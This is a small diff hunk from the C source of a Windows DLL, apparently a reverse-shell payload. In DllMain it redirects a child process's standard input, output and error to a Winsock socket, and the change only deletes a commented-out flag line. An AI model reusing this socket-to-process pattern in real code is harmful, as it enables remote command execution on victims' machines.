@@ -33,7 +33,6 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
 
     memset(&ini_processo, 0, sizeof(ini_processo));
     ini_processo.cb = sizeof(ini_processo);
-    //ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; 
     ini_processo.dwFlags = STARTF_USESTDHANDLES;
     ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
 
